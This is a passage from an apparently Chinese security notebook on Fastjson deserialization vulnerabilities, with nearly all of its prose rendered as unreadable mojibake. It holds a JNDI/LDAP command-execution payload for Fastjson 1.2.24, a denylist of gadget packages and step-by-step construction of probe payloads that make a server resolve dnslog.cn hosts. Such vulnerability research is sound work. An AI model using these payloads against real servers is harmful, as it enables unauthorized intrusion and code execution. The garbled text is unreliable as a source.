\\\"ldap://127.0.0.1:9999/Basic/Command/open -na Calculator\\\",\\\"autoCommit\\\": false}\"; JSON.parseObject(json); } } æ€»ç»“ æ•´ä¸ªè¿‡ç¨‹å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯fastjsonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨å¯¹åº”ç±»è®¾ç½®äº†å‚æ•°çš„setXXXæ–¹æ³•ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸€äº›å¯¹åº”çš„é“¾ï¼ŒåŒæ—¶jdkæ»¡è¶³è¦æ±‚å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚ DEBUGåˆ†æ ä»£ç ä¸¾ä¾‹ package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; JSONObject jsonObject = JSON.parseObject(json); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } å› ä¸ºæˆ‘ä»¬ç°åœ¨çŸ¥é“ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨setXXXçš„æ–¹æ³•ï¼Œæ‰€ä»¥ç°åœ¨setXXXæ–¹æ³•å¤„ä¸‹ä¸ªæ–­ç‚¹ï¼Œçœ‹çœ‹å †æ ˆæƒ…å†µ setAge:28, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, App (org.example) ç„¶åä»ä¸‹å‘ä¸Šå®šä½åˆ†æå°±è¡Œäº†ï¼Œè°ƒç”¨äº†å“ªä¸ªåŒ…é‡å“ªäº›ç±»çš„å“ªäº›æ–¹æ³•ï¼Œä¸€åº”ä¿±å…¨ï¼Œé¿å…ä¸€ç›´F7ã€F8æµªè´¹æ—¶é—´ï¼Œå¯ä»¥æŠŠç²¾åŠ›æ”¾åˆ°å‚æ•°çš„ä¼ é€’è¿½è¸ªä¸Šã€‚ ä¿®å¤æ–¹æ¡ˆ 1.2.25å®˜æ–¹å¯¹æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œå¯¹æ›´æ–°çš„æºç è¿›è¡Œæ¯”è¾ƒï¼Œä¸»è¦çš„æ›´æ–°åœ¨checkAutoTypeå‡½æ•° public Class checkAutoType(String typeName, Class expectClass) { if (typeName == null) { return null; } else { String className = typeName.replace('$', '.'); if (this.autoTypeSupport || expectClass != null) { int i; String deny; for(i = 0; i clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) { clazz = this.deserializers.findClass(typeName); } if (clazz != null) { if (expectClass != null && !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } else { return clazz; } } else { if (!this.autoTypeSupport) { String accept; int i; for(i = 0; i \" + expectClass.getName()); } return clazz; } } } if (this.autoTypeSupport || expectClass != null) { clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader); } if (clazz != null) { if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) { throw new JSONException(\"autoType is not support. \" + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { return clazz; } throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } } if (!this.autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } else { return clazz; } } } } è¿™é‡Œéå†denyListæ•°ç»„ï¼Œåªè¦å¼•ç”¨çš„åº“ä¸­æ˜¯ä»¥æˆ‘ä»¬çš„é»‘åå•ä¸­çš„å­—ç¬¦ä¸²å¼€å¤´çš„å°±ç›´æ¥æŠ›å‡ºå¼‚å¸¸ä¸­æ–­è¿è¡Œã€‚ denyListæ•°ç»„ï¼Œä¸»è¦åˆ©ç”¨é»‘åå•æœºåˆ¶æŠŠå¸¸ç”¨çš„ååºåˆ—åŒ–åˆ©ç”¨åº“éƒ½æ·»åŠ åˆ°é»‘åå•ä¸­ï¼Œä¸»è¦æœ‰ï¼š bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework ä¸€äº›ç»†èŠ‚ parseObject(String text)åœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿä¼šè°ƒç”¨getteræ–¹æ³•ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ä¸€ä¸ªå¯åˆ©ç”¨çš„ç‚¹ï¼Œåªä¸è¿‡æ¯”è¾ƒé¸¡è‚‹ï¼Œç¬¦åˆæ¡ä»¶çš„åˆ©ç”¨é“¾å¾ˆå°‘ ä¸¾ä¾‹æ¼”ç¤º package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(\"parseObject(String)\"); JSON.parseObject(json); System.out.println(\"parse(String)\"); JSON.parse(json); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { System.out.println(\"call getUsername\"); return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { System.out.println(\"call getAge\"); return age; } } åˆ†æ ä¸ºä»€ä¹ˆä¼šè°ƒç”¨getter()æ–¹æ³•å‘¢ï¼Ÿåœ¨getter()æ–¹æ³•çš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹è°ƒç”¨æ ˆ getAge:37, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) get:451, FieldInfo (com.alibaba.fastjson.util) getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer) getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer) toJSON:902, JSON (com.alibaba.fastjson) toJSON:824, JSON (com.alibaba.fastjson) parseObject:206, JSON (com.alibaba.fastjson) main:10, App (org.example) åˆ†æè°ƒç”¨æ ˆï¼Œé¦–å…ˆè¿›å…¥parseObjectæ–¹æ³•ï¼Œç„¶åæ­£å¸¸è°ƒç”¨parseæ–¹æ³•ï¼ˆPSï¼šæ­¤æ—¶setteræ–¹æ³•å·²ç»è¢«è°ƒç”¨äº†ï¼Œå¯ä»¥æŸ¥çœ‹Consoleæ å½“å‰è¾“å‡ºçš„æƒ…å†µï¼‰ æ‰€ä»¥è°ƒç”¨getteræ–¹æ³•çš„åŸå› ï¼Œä¸æ˜¯å‡ºåœ¨parseå‡½æ•°é‡Œé¢ï¼Œè€Œæ˜¯è°ƒç”¨äº†(JSONObject)toJSON(obj)æ–¹æ³• ç»§ç»­è·ŸtoJSONæ–¹æ³•ï¼Œå‘ç°ä¼šåˆ°javaBeanSerializer.getFieldValuesMap(javaObject) æŸ¥çœ‹å½“å‰çš„å˜é‡ï¼ŒjavaBeanSerializerä¸­çš„getterså­˜æ”¾äº†ç›¸å…³çš„getteræ–¹æ³•åç¼€ï¼ŒjavaObjectä¸­å­˜æ”¾äº†ç›¸å…³å˜é‡çš„å€¼ è·Ÿè¿›getFieldValuesMapï¼Œå‘ç°é€šè¿‡Map.putå­˜å…¥æ•°æ®ï¼Œå€¼é€šè¿‡getter.getPropertyValue(object)è¿›è¡Œè·å–ï¼Œobjectå­˜æ”¾çš„æ˜¯setterè®¾ç½®çš„å˜é‡åå’Œå€¼ è·Ÿè¿›getPropertyValueï¼Œä¼šè°ƒç”¨this.fieldInfo.getæ–¹æ³• è·Ÿè¿›getï¼Œå‘ç°åå°„è°ƒç”¨Userç±»çš„getAge()æ–¹æ³• æ‰€ä»¥getteræ–¹æ³•è¢«æ‰§è¡Œäº† TemplatesImplæ”»å‡»è°ƒç”¨é“¾è·¯ https://paper.seebug.org/1274/#templatesimpl å‚è€ƒé“¾æ¥ Fastjson 1.2.24 ååºåˆ—åŒ–æ¼æ´æ·±åº¦åˆ†æ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:52:00 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/05.Fastjsonçš„dnslogæ¢æµ‹æ–¹å¼åˆ†æ.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/2.å„ç§åˆ†æ/05.Fastjsonçš„dnslogæ¢æµ‹æ–¹å¼åˆ†æ.html","title":"05.Fastjsonçš„dnslogæ¢æµ‹æ–¹å¼åˆ†æ","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ è¯´æ˜ åˆ†æ æŒ–æ˜ java.net.InetSocketAddress java.net.Inet4Address java.net.Inet6Address java.net.URL java.net.URI æ€»ç»“ å‚è€ƒæ–‡çŒ® å‰è¨€ æ­£å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°javaåç«¯å¯¹jsonå¤„ç†éƒ½ä¼šå»æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯åç«¯å¤„ç†jsonçš„ç»„ä»¶å¾ˆå¤šï¼Œæ¯”å¦‚fastjsonã€jacksonã€gsonç­‰ï¼Œæ€ä¹ˆåˆ¤æ–­æ˜¯å¦ä½¿ç”¨äº†fastjsonå‘¢ï¼Ÿ æœ‰ä¸€ä¸ªç®€ä¾¿æ— å±å®³çš„æ–¹å¼ï¼Œå°±æ˜¯é€šè¿‡dnslogæ¥åˆ¤æ–­ã€‚ å¤§ä½¬ä»¬è®¨è®ºçš„issue è¯´æ˜ å‰é¢æˆ‘ä»¬åœ¨åˆ†æçš„æ—¶å€™ï¼Œä¼šå‘ç°å¾ˆå¤šæœ‰ä¸€ä¸ªå˜é‡tokenåœ¨è¿›è¡Œåˆ¤æ–­ï¼Œæ¯”å¦‚token == 12 æˆ–è€… token == 14ç­‰ï¼Œé‚£è¿™ä¸ªtokenåˆ°åº•ä»£è¡¨å•¥å‘¢ï¼Ÿåœ¨com.alibaba.fastjson.parser.JSONTokenä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ç­”æ¡ˆ public static String name(int value) { switch(value) { case 1: return \"error\"; case 2: return \"int\"; case 3: return \"float\"; case 4: return \"string\"; case 5: return \"iso8601\"; case 6: return \"true\"; case 7: return \"false\"; case 8: return \"null\"; case 9: return \"new\"; case 10: return \"(\"; case 11: return \")\"; case 12: return \"{\"; case 13: return \"}\"; case 14: return \"[\"; case 15: return \"]\"; case 16: return \",\"; case 17: return \":\"; case 18: return \"ident\"; case 19: return \"fieldName\"; case 20: return \"EOF\"; case 21: return \"Set\"; case 22: return \"TreeSet\"; case 23: return \"undefined\"; case 24: return \";\"; case 25: return \".\"; case 26: return \"hex\"; default: return \"Unknown\"; } } åˆ†æ fastjson 1.2.68 jdk 8u261 åˆ†æä¸€ä¸‹checkAutoType è¿™ä¸ªé»‘åå•æ£€æµ‹ç»•è¿‡åï¼Œä¼šæ¥åˆ°å¦‚ä¸‹å‡ ä¸ªifè¯­å¥ï¼Œå†™äº†ä¸ªç®€å•çš„æ³¨é‡Š // ä»ConcurrentHashMapç±»å˜é‡mappingä¸­å°è¯•è·å–è¿™ä¸ªç±»ï¼Œmappingsæœ‰ç‚¹åƒç»´æŠ¤çš„ä¸€ä¸ªåŸºç¡€ç±»åº“ clazz = TypeUtils.getClassFromMapping(typeName); // å¦‚æœmappingé‡Œé¢æ²¡æœ‰è¿™ä¸ªç±»ï¼Œå°±ä¼šå°è¯•ä»this.deserializers.bucketsè¿™ä¸ªIdentityHashMapç±»çš„Mapä¸­å°è¯•è·å–clazzï¼Œè¿™ä¸ªæœ‰ç‚¹åƒå¼€å‘è€…ç»´æŠ¤çš„ä¸€ä¸ªå¯ä¿¡ä»»ç±» if (clazz == null) { clazz = this.deserializers.findClass(typeName); } // å¦‚æœclazzè¿˜æ˜¯ä¸ºnullï¼Œå°±ä¼šå°è¯•ä»this.typeMappingä¸­å»è·å–ç±»ï¼Œä½†è¿™ä¸ªç±»é»˜è®¤æ˜¯ç©ºçš„ if (clazz == null) { clazz = (Class)this.typeMapping.get(typeName); } // å¦‚æœåœ¨ç™½åå•ï¼Œå°±ç›´æ¥åŠ è½½è¿™ä¸ªclazz if (internalWhite) { clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true); } // å¦‚æœclazzä¸ä¸ºnullï¼Œä¸”ä¸æ»¡è¶³åç»­çš„åˆ¤å®šæ¡ä»¶ï¼Œå°±ç›´æ¥è¿”å›clazz if (clazz != null) { if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } else { return clazz; } } ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½åœ¨ä¸Šé¢çš„å‡ ä¸ªMapä¸­æ‰¾åˆ°ä¸€äº›å¯åˆ©ç”¨çš„ç±»ï¼Œé‚£ä¹ˆé»˜è®¤æƒ…å†µä¸‹ï¼ˆå…³é—­autoTypeçš„æƒ…å†µï¼‰å°±å¯ä»¥ç»•è¿‡é»‘ç™½åå•æ£€æŸ¥ï¼Œç›´æ¥è¿”å›clazzè¿›å…¥åç»­æ“ä½œ åˆ†æä¸€ä¸‹é‡Œé¢ä¸€å…±æœ‰å“ªäº›ç±» mappings ((ConcurrentHashMap) mappings).keySet() this.buckets Object[] a = new Object[9000]; for(int i = 0; i this.typeMapping é»˜è®¤ä¸ºç©º æ±‡æ€»ä¸€ä¸‹æ‰€æœ‰ç±»ï¼š java.lang.IndexOutOfBoundsException java.lang.Integer java.lang.NoSuchFieldException java.lang.Long java.math.BigInteger java.lang.LinkageError java.lang.StringIndexOutOfBoundsException java.lang.StackOverflowError long java.lang.VerifyError java.util.LinkedHashMap java.util.Calendar java.lang.StackTraceElement [long java.lang.NoSuchMethodError java.util.concurrent.atomic.AtomicLong java.util.TreeMap java.util.Date java.lang.NoSuchFieldError java.util.concurrent.atomic.AtomicInteger java.lang.Short java.util.Locale java.lang.InstantiationException java.lang.SecurityException java.sql.Timestamp java.util.concurrent.ConcurrentHashMap java.util.UUID java.lang.IllegalAccessError com.alibaba.fastjson.JSONObject [short java.util.HashSet [byte java.lang.Boolean java.sql.Date short java.lang.Object java.util.BitSet [char java.lang.Float java.math.BigDecimal java.lang.Character java.lang.InternalError [double byte double java.lang.Exception java.lang.Double [B java.lang.TypeNotPresentException [C [D java.text.SimpleDateFormat [F [I java.util.TreeSet [J java.util.ArrayList java.lang.IllegalMonitorStateException com.alibaba.fastjson.JSONArray [S java.lang.String java.lang.Number java.util.LinkedHashSet [Z java.lang.NegativeArraySizeException java.lang.NumberFormatException java.lang.RuntimeException char java.lang.OutOfMemoryError java.lang.IllegalStateException java.sql.Time java.lang.NoSuchMethodException java.util.Collections$EmptyMap [boolean float java.lang.AutoCloseable java.lang.NullPointerException java.lang.Byte [int com.alibaba.fastjson.JSONPObject java.lang.Cloneable java.lang.IllegalAccessException java.util.IdentityHashMap java.util.HashMap java.lang.NoClassDefFoundError java.util.Hashtable java.util.WeakHashMap java.lang.IllegalThreadStateException java.lang.IllegalArgumentException int java.util.concurrent.TimeUnit boolean java.lang.InstantiationError java.lang.InterruptedException [float java.util.regex.Pattern com.alibaba.fastjson.JSONArray java.lang.StringBuilder java.nio.charset.Charset java.math.BigDecimal char java.io.File java.lang.String boolean java.net.InetSocketAddress java.lang.Character java.lang.Number java.util.concurrent.ConcurrentHashMap javax.xml.datatype.XMLGregorianCalendar java.net.Inet4Address java.sql.Date java.util.Collection com.alibaba.fastjson.JSONPath java.util.concurrent.atomic.AtomicIntegerArray java.util.TreeMap short java.util.Currency java.sql.Time java.lang.Integer double java.lang.Class java.math.BigInteger com.alibaba.fastjson.JSONObject java.util.concurrent.atomic.AtomicBoolean java.util.concurrent.atomic.AtomicLongArray java.util.HashMap java.util.TimeZone java.lang.Comparable java.util.ArrayList java.text.SimpleDateFormat com.alibaba.fastjson.JSONPObject java.lang.StringBuffer byte java.io.Closeable java.lang.Double java.util.concurrent.atomic.AtomicInteger int java.lang.Float java.net.URL java.util.List java.lang.Object java.sql.Timestamp java.lang.StackTraceElement java.net.Inet6Address java.util.concurrent.atomic.AtomicLong java.net.URI java.util.UUID java.lang.Cloneable java.util.LinkedHashMap long java.lang.Short java.lang.Byte [C java.lang.ref.WeakReference java.lang.ref.SoftReference java.util.concurrent.ConcurrentMap java.util.Calendar java.util.Date java.util.Locale java.lang.Long java.util.Map java.io.Serializable java.util.concurrent.atomic.AtomicReference java.lang.Boolean float æŒ–æ˜ æ—¢ç„¶å·²ç»æ‹¿åˆ°è¿™äº›ç±»äº†ï¼Œæˆ‘ä»¬å¤§æ¦‚ç­›é€‰ä¸€ä¸‹å“ªäº›æ˜¯å¯ä»¥ç”¨çš„ï¼ˆè¿™é‡Œç­›é€‰çš„æ˜¯java.net.xxxçš„ï¼Œå› ä¸ºå¸¦netçš„å‡ ä¹éƒ½å’Œç½‘ç»œç›¸å…³å¯ä»¥å‘èµ·è¯·æ±‚ï¼‰ java.net.InetSocketAddress java.net.Inet4Address java.net.URL java.net.Inet6Address java.net.URI é‚£æˆ‘ä»¬ä»ç¬¬ä¸€ä¸ªå¼€å§‹ java.net.InetSocketAddress åˆå§‹payload {\"@type\":\"java.net.InetSocketAddress\", \"a\":\"b\"} é€šè¿‡checkAutoTypeåï¼ŒæˆåŠŸæŒ‰ç…§æˆ‘ä»¬çš„é¢„æœŸè¿”å› ç„¶åè·Ÿåˆ°371è¡Œï¼Œæ‰§è¡Œååºåˆ—åŒ–æ“çºµï¼Œè·³è¿‡è¿™ä¸€æ­¥ä¼šç›´æ¥æŠ›å‡ºé”™è¯¯å¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬è·Ÿè¿› è·Ÿè¿›åï¼Œåˆ¤æ–­ç±»ï¼Œé€šè¿‡ å¼€å§‹åˆ¤æ–­tokenï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„tokenæ˜¯16ï¼Œå³,ï¼Œä¸ç­‰äº8ï¼Œè¿›å…¥else æ¥åˆ°äº†parser.accept(token)åï¼Œä¸çŸ¥é“è¿™ä¸ªå‡½æ•°å¹²å•¥çš„ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼Œå‘ç°åŸæ¥æ˜¯åˆ¤æ–­å½“å‰çš„tokenæ˜¯ä¸æ˜¯ä¼ å…¥çš„tokenï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œæˆ‘ä»¬æ˜¯16ä¸æ˜¯12ï¼Œæ‰€ä»¥ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ é‚£æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹payloadï¼Œç»™ä»–æä¾›ä¸€ä¸ª {ï¼Œä¹Ÿå°±æ˜¯token=12 {\"@type\":\"java.net.InetSocketAddress\"{, \"a\":\"b\"} è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±èƒ½æˆåŠŸé€šè¿‡acceptè¿™ä¸ªå‡½æ•°äº†ï¼Œç»§ç»­å‘ä¸‹ å‘ç°æœ‰ä¸ªå˜é‡classNameï¼Œä¸‹æ–¹è¦æ±‚ä»–ç­‰äºaddressï¼Œä¸”æœŸæœ›å®ƒä¸‹ä¸€ä½çš„tokenæ˜¯17ï¼ˆ:ï¼‰ é‚£æˆ‘ä»¬çœ‹çœ‹classNameæ˜¯æ€ä¹ˆå¾—æ¥çš„ï¼Œè·Ÿè¿›stringVal å‘ç°è¿™å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åˆ‡å‰²å‡½æ•°ï¼Œthisä¸ºæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå› ä¸ºthis.hasSpecialä¸ºfalse this.npå°±æ˜¯å½“å‰è¿™ä¸ªå­—ç¬¦ä¸²ç°åœ¨çš„æ¸¸æ ‡ä½ç½®ï¼Œè€Œthis.spåˆ™æ˜¯åˆ‡å‰²çš„é•¿åº¦ï¼Œæˆ‘ä»¬å†çœ‹ä¸‹è¿™ä¸ªthis.spæ˜¯æ€ä¹ˆå˜å¾— å‰æœŸé˜¶æ®µï¼Œæ˜¯ç»Ÿè®¡2ä¸ª\"ä¸­é—´çš„é•¿åº¦çš„ï¼Œæ–¹ä¾¿åé¢åˆ‡å‰² åé¢ä¼°è®¡ä¹Ÿå·®ä¸å¤šï¼Œå‘ç°åœ¨è¿›å…¥ååºåˆ—åŒ–è¿‡åï¼Œpaper.acceptçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨nextTokenï¼Œå…¶ä¸­ä¼šç”¨åˆ°this.sp è·Ÿä¸€ä¸‹å‘ç°ï¼Œè¿™ä¸ªå­—ç¬¦å°±æ˜¯æˆ‘ä»¬payloadä¸­{åé¢çš„,ï¼ŒæœŸæœ›ä¸€ä¸ª\"ï¼Œä½†æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ˜¯,ï¼Œæ‰€ä»¥this.spå°±ç­‰äº0äº† æ‰€ä»¥è¿˜éœ€è¦å¢åŠ ä¸€å¯¹\"ï¼Œæ¥å¢åŠ this.spçš„å€¼ï¼Œè¾¾åˆ°åˆ‡å‰²å­—ç¬¦ä¸²çš„ç›®çš„ {\"@type\":\"java.net.InetSocketAddress\"{\"aaa\", \"a\":\"b\"} æ›´æ¢payloadåï¼ŒæˆåŠŸé€šè¿‡ä¸Šæ–¹çš„åˆ¤æ–­ï¼Œè¿›å…¥this.scanString()ï¼Œè¿™é‡Œé¢this.sp++ä¼šåˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ æ­¤æ—¶this.spé—®é¢˜è§£å†³äº†ï¼Œæˆ‘ä»¬ç»§ç»­å›åˆ°lexer.stringVal()ï¼Œè·Ÿè¿›ï¼Œå¯ä»¥çœ‹åˆ°ç°åœ¨åˆ‡å‰²å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„aaa ç»§ç»­å¾€åï¼Œå‘ç°classNameè¦ç­‰äºaddressï¼Œæ‰€ä»¥ç»™æˆ‘ä»¬çš„aaaæ”¹æˆaddresså³å¯ï¼Œæ­¤å¤–æœŸæœ›tokenæ˜¯17ï¼Œé‚£è¿˜éœ€è¦åŠ ä¸€ä¸ª: æ‰€ä»¥ä¿®æ”¹åçš„payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":\"aaa\", \"a\":\"b\"} ä¸€è·¯é¡ºåˆ©ï¼Œåˆ°äº†parser.parseObjectè¿™é‡Œä¼šè¿›è¡Œç±»å‹è½¬æ¢ä¸ºInetAddress åˆæ˜¯ä¸€è·¯é¡ºåˆ©ï¼Œåˆ°äº†deserializer.deserialze,åªä¸è¿‡è¿™æ¬¡ä¼ å…¥çš„Typeæ˜¯InetAddress åˆå›åˆ°äº†ç†Ÿæ‚‰çš„åœ°æ–¹ ç„¶åä¸€é¡¿è°ƒï¼ŒæŠ›å‡ºå¼‚å¸¸äº† å›çœ‹äº†ä¸€ä¸‹ï¼ŒåŸæ¥æ˜¯è¿™ä¸ªåœ°æ–¹è¦æ±‚æ˜¯16ï¼ˆ:ï¼‰ï¼Œè€Œæˆ‘ä»¬æ˜¯4ï¼ˆStringï¼‰ã€‚ã€‚ã€‚ é‚£å“ªä¸ªåœ°æ–¹çš„Stringå‡ºé—®é¢˜äº†å‘¢ï¼Ÿ åˆ†æä¸€ä¸‹å½“å‰æ¸¸æ ‡çš„ä½ç½®ï¼Œå‘ç°å°±æ˜¯\"address\":åé¢åº”è¯¥æ˜¯ä¸ª,ï¼Œè€Œä¸æ˜¯String æ‰€ä»¥å†æ”¹payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"a\":\"b\"} åˆå›åˆ°åˆšæ‰çš„åœ°æ–¹ï¼Œè¿™æ¬¡è¿‡äº†ï¼Œä½†æ˜¯è¦æ±‚lexer.stringVal()ä¸ºval ç†Ÿæ‚‰çš„å‡½æ•°ï¼Œåˆšæ‰æˆ‘ä»¬åˆ†æè¿‡äº†ï¼Œå°±æ˜¯éœ€è¦ä¸€ä¸ª\"xxx\"ï¼Œä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥\"a\"æ˜¯æˆ‘ä»¬åé¢çš„é”®å€¼å¯¹ä¸­çš„é”® é‚£æˆ‘ä»¬ç»™aæ”¹æˆval {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"b\"} ç„¶åå›åˆ°åˆšæ‰çš„æ¡ä»¶ï¼Œç»§ç»­å‘åï¼Œéƒ½æ˜¯æ»¡è¶³çš„ï¼Œæˆ‘ä»¬payloadä¸­valçš„å€¼èµ‹ç»™äº†objVal ç±»å‹è½¬æ¢ï¼Œèµ‹å€¼ç»™strVal è¿”å›InetAddress.getByName(strVal) è€ŒInetAddress.getByNameä¼šå°è¯•é€šè¿‡åŸŸåè·å–IP æ‰€ä»¥ç»™strValçš„å€¼è®¾ç½®ä¸ºdnslogçš„URLå³å¯ æœ€ç»ˆPayload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"enst5r.dnslog.cn\"} æˆåŠŸ æœ€åå°å°çš„æ€»ç»“ä¸€ä¸‹ï¼šå°±æ˜¯æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¼ºä»€ä¹ˆç»™ä»–è¡¥ä»€ä¹ˆ java.net.Inet4Address åˆå§‹payload {\"@type\":\"java.net.Inet4Address\", \"a\":\"b\"} è¿è¡Œï¼Œç»è¿‡checkAutoTypeåååºåˆ—åŒ–ï¼Œå’Œä¸Šé¢ä¸€æ ·çš„é”™ï¼Œéœ€è¦valï¼Œè€Œæ­¤æ—¶çš„å€¼æ˜¯a æˆ‘ä»¬ç»™aæ¢æˆvalå°±è¡Œäº† {\"@type\":\"java.net.Inet4Address\", \"val\":\"b\"} æœ€åè§£æçš„æ—¶å€™ï¼Œä¸€æ ·çš„æ–¹æ³•ï¼ŒInetAddress.getByName(strVal) æœ€ç»ˆPOC {\"@type\":\"java.net.Inet4Address\", \"val\":\"dnslog\"} java.net.Inet6Address çœ‹äº†ä¸‹ï¼Œå’Œ java.net.Inet4Address ä¸€æ ·ï¼Œå°±ä¸å†å†™äº† {\"@type\":\"java.net.Inet6Address\", \"val\":\"dnslog\"} java.net.URL è¿™ä¸ªå°±ä¸èƒ½ç›´æ¥æ¥ç¡¬çš„äº†ï¼Œæ ¹æ®æˆ‘ä»¬ä¹‹å‰åˆ†æè¿‡çš„ysoserial#URLDNSè¿™æ¡é“¾ï¼Œå¦‚æœå°†ä¸€ä¸ªURLå¯¹è±¡æ”¾ç½®åˆ°HashMapä¸­ï¼Œé‚£ä¹ˆåœ¨è¿›è¡Œè®¡ç®—hashcodeçš„æ—¶å€™ï¼Œä¼šè§¦å‘dnslogè¯·æ±‚ æ‰€ä»¥æˆ‘ä»¬è®©fastjsonç»™å¯¹è±¡ååºåˆ—åŒ–ä¸ºURLå¯¹è±¡çš„åï¼Œå†æŠŠå®ƒæ”¾åˆ°HashMapä¸­å³å¯ {{\"@type\":\"java.net.URL\", \"val\":\"http://8fhj7r.dnslog.cn\"}:\"a\"} ä¸‹æ–­ç‚¹åˆ†æï¼Œfastjsonç»™å‰é¢è¿˜åŸæˆäº†URLå¯¹è±¡ï¼Œå½“åšäº†key ç„¶åç»§ç»­è·Ÿï¼Œå‘ç°ä½¿ç”¨putå°†å…¶æ·»åŠ åˆ°HashMapä¸­ï¼Œæ‰€ä»¥dnslogæ”¶åˆ°äº†è¯·æ±‚ java.net.URI ä¸èƒ½å’ŒURLç±»ç±»ä¼¼ä¼¼ä½¿ç”¨HashMapè®¡ç®—keyçš„hashCodeæ–¹æ³•å»å‘èµ·è¯·æ±‚ å†…éƒ¨ä¹Ÿæ²¡æœ‰ç±»ä¼¼çš„å‘èµ·è¯·æ±‚çš„æ–¹æ³• æ‰€ä»¥ç›®å‰æ²¡æ‰¾åˆ°åˆ©ç”¨æ–¹æ³•emmmmm æ€»ç»“ 